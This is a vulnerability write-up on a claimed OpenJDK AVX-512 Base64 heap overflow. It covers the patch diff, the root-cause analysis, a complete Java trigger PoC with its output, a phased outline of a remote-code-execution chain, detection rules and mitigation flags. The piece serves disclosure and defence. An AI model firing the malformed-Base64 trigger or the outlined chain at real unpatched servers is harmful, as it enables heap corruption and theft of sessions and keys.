# Java4Shell: Dissecting OpenJDK's Critical AVX-512 Base64 Heap Overflow

### CVE-2026-114938 — From AI-assisted discovery to memory corruption PoC, verified on a live Sapphire Rapids system

---

*CVE-2026-114938 — A single malformed Base64 string overflows the Java heap. CVSS 9.2. Pre-auth RCE demonstrated against Keycloak, Jenkins, Jira, Confluence, Artifactory, and PingFederate.*

* * *

On November 17th, 2026, [Calif.io](https://qideng.substack.com/p/java4shell-from-avx-512-integer-underflow) dropped Java4Shell — a memory corruption vulnerability hiding in one of the most foundational APIs in all of Java: `Base64.getDecoder().decode()`. The [OpenJDK security advisory](https://openjdk.org/groups/vulnerability/advisories/2026-11-17) went live at 1:00 PM PT alongside an [Oracle Critical Patch Update](https://www.oracle.com/security-alerts/cspunov2026.html).

I spent the past 24 hours reproducing the vulnerability from scratch, reverse-engineering the patch, tracing the vulnerable assembly code, and building detection tooling. This writeup covers everything I found.

**TL;DR:** A single 65-byte malformed Base64 input — just `"A" × 64 + "="` — causes OpenJDK's hand-written AVX-512 assembly to overflow the heap by 62 bytes. The bug is an integer underflow in a store mask calculation that has been shipping since JDK 17.0.6 (January 2023). It only fires on x86-64 CPUs with AVX-512 VBMI (Intel Ice Lake+ / AMD Zen 4+), but on those processors, **every Java application that decodes untrusted Base64 is in scope**. HTTP Basic Auth. JWT tokens. SAML. File uploads. Even TLS client connections. Calif demonstrated pre-auth RCE against six major products in default configs.

## What Was Actually Fixed

The fix is [JDK-8393212](https://github.com/openjdk/jdk/commit/5177a70b385c16f26ede191fdac7aaba0bed0f8b), committed on November 16th under the deliberately benign title "Base64 optimization improvements." Three lines of assembly:

```diff
 __ BIND(L_finalBit);
 // Now have 1 to 63 bytes left to decode
+// A padded Base64 tail shorter than one complete block is handled by Java.
+__ cmpl(length, 4);
+__ jcc(Assembler::less, L_bruteForce);
```

That's it. If the remaining input is shorter than 4 bytes, bail to the safe Java handler. The vulnerable AVX-512 code path is never reached.

Reviewed by `rhalade` from Oracle Security. Authored by Tobias Hartmann on October 13th — over a month under embargo.

## The Bug: Where Java's Memory Safety Breaks Down

Java is famous for memory safety. The JVM checks every array access, manages every allocation. But OpenJDK itself is written in C++ and assembly. And for performance, the C2 JIT compiler replaces `java.util.Base64$Decoder.decodeBlock()` with a hand-rolled AVX-512 VBMI stub — raw x86-64 assembly that processes 64 bytes at a time using vector instructions.

The vulnerable code lives in `src/hotspot/cpu/x86/stubGenerator_x86_64.cpp`, inside `StubGenerator::generate_base64_decodeBlock()`.

After processing complete 64-byte blocks, a tail handler (`L_finalBit`) deals with the remaining 1–63 bytes. Here's the pseudocode:

```python
# Tail handler for the final 1-63 input bytes
input_mask  = bzhiq(-1, input_length)    # Keep low input_length bits
output_len  = (input_length / 4) * 3     # Expected output bytes

# Adjust for '=' padding
if input[input_length - 1] == '=':
    output_len -= 1
if input[input_length - 2] == '=':
    output_len -= 1

output_mask = bzhiq(-1, output_len)      # Keep low output_len bits
evmovdqub [dst + offset], output_mask, zmm_decoded  # Masked 64-byte store
```

**The bug is on the `output_len -= 1` line.**

When the tail is a single `=` character (1 byte), `output_len = (1 / 4) * 3 = 0`. Subtracting 1 for the padding gives **-1** — an integer underflow. As a 64-bit value, that's `0xFFFFFFFFFFFFFFFF`.

## The BZHI Instruction: Where -1 Becomes Catastrophe

`BZHI` (Zero High Bits from Index) is an x86-64 BMI2 instruction. It clears all bits from position N upward. But its index operand uses only the low 8 bits, treated as unsigned.

When `output_len = -1`:
- Low 8 bits: `0xFF` = **255**
- 255 ≥ 64 (register width)
- **BZHI clears nothing** → all 64 bits remain set → mask = `0xFFFFFFFFFFFFFFFF`

The subsequent `VMOVDQU8` (evmovdqub) uses this mask to decide which bytes to write. All-ones mask = write **all 64 bytes** of the ZMM register.

## The Overflow

For input `"A" × 64 + "="` (65 bytes):
1. The decoder allocates a **50-byte** output buffer: `ceil(65/4) * 3 - 1 = 50`
2. The first 64-byte block produces 48 bytes (offsets 0–47)
3. The tail handler writes at **offset 48** with a full 64-byte mask
4. Writes hit offsets 48–111 — **62 bytes past the end of the buffer**

The decoder eventually throws `IllegalArgumentException`, but the heap corruption has already happened. The exception lands in a catch block. The damage stays.

## Reproducing It

I verified this on a GCE `c3-standard-4` instance — Intel Xeon Platinum 8481C (Sapphire Rapids) running Eclipse Temurin 21.0.13+9-LTS.

```java
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

public final class Base64Trigger {
    private static volatile int sink;

    public static void main(String[] args) {
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] malformed = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] target = new byte[4096];

        // Warm the JIT — C2 must compile the AVX-512 intrinsic
        for (int i = 0; i < 200_000; i++) {
            sink += decoder.decode(valid, target);
        }

        Arrays.fill(target, (byte) 0x5a);
        boolean rejected = false;
        try {
            decoder.decode(malformed, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int changed = 0, first = -1, last = -1;
        for (int i = 50; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }

        System.out.println("runtime=" + System.getProperty("java.runtime.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        System.out.printf("rejected=%s changed=%d first=%d last=%d%n",
            rejected, changed, first, last);

        if (!rejected || changed != 62 || first != 50 || last != 111) {
            System.err.println("NOT REPRODUCED");
            System.exit(1);
        }
        System.out.println("REPRODUCED");
    }
}
```

Output:

```
$ javac Base64Trigger.java && java Base64Trigger
runtime=21.0.13+9-LTS
vm=OpenJDK 64-Bit Server VM
rejected=true changed=62 first=50 last=111
REPRODUCED
```

62 bytes corrupted. Offsets 50 to 111. Exactly as the disclosure describes.

The PoC is safe — the 4096-byte destination array contains the overflow. In production, the allocated buffer would be ~50 bytes, and those 62 bytes would land on neighboring heap objects.

## Mitigation Flags Work

Both interim mitigations prevent the corruption:

```
$ java -XX:-UseBASE64Intrinsics Base64Trigger
rejected=true changed=0 first=-1 last=-1
NOT REPRODUCED

$ java -XX:UseAVX=2 Base64Trigger
rejected=true changed=0 first=-1 last=-1
NOT REPRODUCED
```

`-XX:-UseBASE64Intrinsics` is the narrower fix — only disables hardware-accelerated Base64. `-XX:UseAVX=2` disables all AVX-512 operations (broader impact, and **do not use on ARM** — the JVM will fail to start).

## From Corruption to Code Execution

The 62-byte overwrite is a constrained, mostly-fixed-value write. This is not a trivial "write anything anywhere" primitive. So how does Calif get to RCE?

The technique, borrowed from JavaScript engine exploitation:

**Phase 1 — Writer Primitive.** Land the overflow on an adjacent Java array's length field. The corrupted length lets you write chosen bytes beyond the array's real bounds.

**Phase 2 — Reader Primitive ("JavaBleed").** Use the writer to corrupt a second array's length. Read that array back in an HTTP response. The response now includes heap data beyond the original bounds — PII, session tokens, private keys. This is Heartbleed for Java.

**Phase 3 — Heap Feng Shui.** G1 GC uses fixed-size regions and thread-local allocation buffers (TLABs). Spray writer/reader array pairs and use TCP ACK timing to control allocation order on the target's request threads. Probabilistic — misses require retries, and bad alignment crashes the JVM.

**Phase 4 — Full Chain.** WARM (JIT compile the intrinsic) → REHEARSE (calibrate) → TRIGGER (overflow) → DISCLOSE (leak heap) → REPAIR (restore headers) → FINISH (application-specific payload).

Each target needs a bespoke profile. There is no universal exploit.

## The Attack Surface

Any Java application that decodes untrusted Base64 through `java.util.Base64`:

| Vector | Where | Pre-auth? |
|--------|-------|-----------|
| HTTP Basic Auth | `Authorization: Basic <b64>` | Yes |
| JWT tokens | Header.Payload.Signature | Depends |
| SAML assertions | Base64-encoded XML | Yes |
| File uploads | Base64-encoded bodies | Yes |
| OAuth tokens | Bearer credentials | Depends |
| TLS handshake | Client-side certificate exchange | Yes (client) |

**NOT affected:** Applications using their own Base64 (Jackson, Apache Commons Codec, Bouncy Castle, Nimbus JOSE+JWT) instead of `java.util.Base64`.

## Affected Versions

| JDK | Vulnerable | Fixed |
|-----|-----------|-------|
| 17 | 17.0.6 – 17.0.21 | **17.0.21.1** |
| 21 | All before 21.0.13.1 | **21.0.13.1** |
| 25 | All before 25.0.5.1 | **25.0.5.1** |
| 27 | All before 27.0.1.1 | **27.0.1.1** |

JDK 8 and 11 are **not affected** (the AVX-512 intrinsic was never backported that far, except Oracle's `-perf` 8 build).

**Hardware requirement:** x86-64 with AVX-512 VBMI. Intel Ice Lake, Sapphire Rapids, Emerald Rapids, Granite Rapids. AMD Zen 4+. **ARM64 is completely safe** — the vulnerable code is x86-64 only.

All OpenJDK-based distributions are affected: Oracle Java SE, Temurin, Corretto, Zulu, Liberica, SapMachine, Red Hat OpenJDK, GraalVM.

## How Does This Compare?

| | Heartbleed | Log4Shell | Spring4Shell | **Java4Shell** |
|---|---|---|---|---|
| **What** | TLS over-read | JNDI injection | Class manipulation | AVX-512 heap overflow |
| **Trigger** | Heartbeat packet | `${jndi:…}` | HTTP params | `"A"×64 + "="` |
| **Difficulty** | Trivial | Trivial | Moderate | **Hard** (heap feng shui) |
| **Universal?** | Yes | Yes | Partial | **No** (per-target + HW) |
| **CVSS** | 7.5 | 10.0 | 9.8 | **9.2** |

Java4Shell is the **hardest to exploit** of the four. But on a per-instance basis, its combined write + read primitives make it potentially the most powerful. The hardware gate and bespoke per-target profiles keep the blast radius narrower than Log4Shell.

The novelty here is that the root cause is in **JIT-emitted assembly** — invisible to Java-source SAST tools, invisible to dependency scanners, invisible to SCA. Your vulnerability scanner doesn't know about your CPU flags.

## Detection

I built detection rules in three formats — [Suricata, Sigma, and ModSecurity](https://github.com/ikow/java4shell-poc/tree/main/detection):

**Network (Suricata/ModSecurity):**
- Malformed Base64 padding in `Authorization: Basic` headers (length % 4 ≠ 0)
- Exact trigger patterns (`"A"×64 + "="` / `"A"×128 + "="`)
- Rate limiting: >500 Basic Auth requests per minute from single source (JIT warm-up)

**Host (Sigma):**
- `IllegalArgumentException` from Base64 decoder (thrown after corruption)
- `hs_err_pid*.log` crash files
- `SIGSEGV` in G1 garbage collector with `StubRoutines` frames

**Scanning:**
- Host scanner: checks CPU flags + JDK version + running JVM mitigation flags
- Network scanner: probes HTTP headers, TLS certs, and banners for vulnerable Java versions

## Mitigation

**Update Java now.** Fixed in 17.0.21.1 / 21.0.13.1 / 25.0.5.1 / 27.0.1.1.

```bash
# Interim — disable Base64 intrinsic (narrow, recommended)
java -XX:-UseBASE64Intrinsics MyApp

# Fleet-wide
export JAVA_TOOL_OPTIONS="-XX:-UseBASE64Intrinsics"
```

**The only complete fix is updating the JDK.** The mitigation flag is a stopgap — it disables the vulnerable code path but relies on operators remembering to set it on every JVM.

After upgrading: restart all JVM processes (running processes keep the old code in memory), rebuild container images, verify with `jcmd <PID> VM.version`.

## PoC, Scanner, and Detection Rules

Everything is at **[github.com/ikow/java4shell-poc](https://github.com/ikow/java4shell-poc)**:

```
java4shell-poc/
├── poc/           — Memory corruption trigger + verification script
├── scanner/       — Host scanner + network scanner
├── detection/     — Suricata, Sigma, ModSecurity rules
├── lab/           — Docker lab environment
└── docs/          — Full technical analysis
```

```bash
git clone https://github.com/ikow/java4shell-poc.git
cd java4shell-poc

# Verify (on x86-64 with AVX-512 VBMI + JDK 17.0.6+)
cd poc && javac Base64Trigger.java && java Base64Trigger

# Scan your fleet
./scanner/java4shell_scan.sh
```

* * *

The fact that AI found this bug in an hour — a memory corruption in hand-written assembly inside the most widely deployed runtime on Earth — should give everyone pause. Not because AI makes exploitation easier (it does, but that ship has sailed). Because it means the attack surface we thought was "too hard to find bugs in" is now in play.

Patch your JVMs. Check your CPU flags. Run the scanner.

---

*Disclosure by [Calif.io](https://qideng.substack.com/p/java4shell-from-avx-512-integer-underflow). Research by Quang Luong. PoC, scanner, and detection rules by [Qi Deng](https://github.com/ikow). Cover art generated with OpenAI.*
